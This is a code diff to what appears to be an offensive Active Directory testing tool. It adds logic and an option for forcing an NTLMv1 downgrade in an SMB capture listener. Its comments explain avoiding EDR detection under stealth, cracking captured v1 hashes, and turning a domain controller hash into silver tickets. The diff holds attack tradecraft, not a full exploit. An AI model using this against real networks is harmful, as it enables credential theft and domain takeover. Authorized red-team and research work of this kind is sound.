@@ -29,7 +29,7 @@ import asyncio
 from dataclasses import dataclass, field
 import subprocess
 import time
-from typing import Callable, Iterable
+from typing import Any, Callable, Iterable, Mapping
 
 import queue as _queue
 import threading
@@ -399,6 +399,40 @@ def _native_trigger_command(
     return command
 
 
+def should_force_ntlm_downgrade(
+    domain_data: Mapping[str, Any] | None,
+    ip: str,
+    *,
+    stealth: bool = False,
+) -> bool:
+    """Decide whether to force an NTLMv1 downgrade against ``ip``. SSOT.
+
+    The gate (owner directive): downgrade only when the host is KNOWN v1-capable
+    — i.e. the auth-type sweep already classified it ``NTLMv1`` in
+    ``domain_data["ntlm_auth_type_by_host"][ip]`` — AND we are not operating under
+    max-stealth. The pinned ``1122334455667788`` challenge is the Responder IOC
+    (MDI/EDR alert), so it must never fire under stealth, and there is no value in
+    forcing it against a v2-only host (the client returns v2 regardless).
+
+    Args:
+        domain_data: The per-domain state (``shell.domains_data[domain]``).
+        ip: The target host IP whose verdict to consult.
+        stealth: True when max-stealth posture forbids the Responder IOC.
+
+    Returns:
+        True only for a host with a persisted ``NTLMv1`` verdict and no stealth.
+    """
+    if stealth:
+        return False
+    host_map = (domain_data or {}).get("ntlm_auth_type_by_host") or {}
+    if not isinstance(host_map, Mapping):
+        return False
+    verdict = host_map.get(str(ip)) or {}
+    if not isinstance(verdict, Mapping):
+        return False
+    return str(verdict.get("ntlm_auth_type") or "").strip() == "NTLMv1"
+
+
 class NativeListenerCapture:
     """SMB relay listener backed by ``aiosmb`` for active coercion capture.
 
@@ -421,9 +455,16 @@ class NativeListenerCapture:
         *,
         listen_host: str = "0.0.0.0",
         listen_port: int = 445,
+        force_ntlm_downgrade: bool = False,
     ) -> None:
         self.listen_host = listen_host
         self.listen_port = listen_port
+        # NTLMv1 downgrade-capture (Responder --disable-ess parity). Default OFF.
+        # A caller sets this True only against a KNOWN v1-capable host and outside
+        # max-stealth posture — the pinned challenge is the Responder IOC. When on,
+        # a v1-capable client returns a crack.sh-rainbow-crackable plain NetNTLMv1
+        # (on a DC: the machine-account NT hash → silver ticket / S4U).
+        self.force_ntlm_downgrade = force_ntlm_downgrade
         self._capture_queue: _queue.Queue[NtlmCaptureObservation] = _queue.Queue()
         self._thread: threading.Thread | None = None
         self._loop: asyncio.AbstractEventLoop | None = None
@@ -580,7 +621,11 @@ class NativeListenerCapture:
             extract_ntlm_hash,
         )
 
-        config = SMBNtlmCaptureConfig(listen_host=self.listen_host, listen_port=self.listen_port)
+        config = SMBNtlmCaptureConfig(
+            listen_host=self.listen_host,
+            listen_port=self.listen_port,
+            force_ntlm_downgrade=self.force_ntlm_downgrade,
+        )
         gssapi_queue: asyncio.Queue[object] = asyncio.Queue()
         source = SMBNtlmCaptureSource(config, gssapi_queue)
         self._source = source
